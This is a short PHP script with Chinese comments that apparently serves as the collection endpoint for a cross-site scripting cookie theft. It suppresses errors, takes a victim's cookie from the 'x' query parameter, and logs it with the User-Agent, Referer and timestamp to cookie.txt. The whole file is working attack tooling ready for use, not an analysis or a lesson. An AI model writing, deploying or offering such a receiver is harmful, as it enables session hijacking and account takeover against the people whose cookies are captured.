<?php
/**
 * Created by PhpStorm.
 * User: admin
 * Date: 2018/10/24
 * Time: 10:22
 */

error_reporting(0);  #抑制错误
date_default_timezone_set('Asia/shanghai'); #设置时区
$cookie = $_GET['x'];    #得到cookie
$ua = $_SERVER['HTTP_USER_AGENT'];   #得到UA
$refere =  $_SERVER['HTTP_REFERER'];  #得到refere
$time =date('Y-m-d h:i:s');  #显示时间
$handle = fopen('cookie.txt','a');  #打开cookie.txt文件
$data = 'Time:'.$time.'UA:'.$ua.'Refere:'.$refere.'cookie:'.$cookie."\n";  #组合字符串
fwrite($handle,$data);  #写入数据
fclose($handle);  #关闭文件






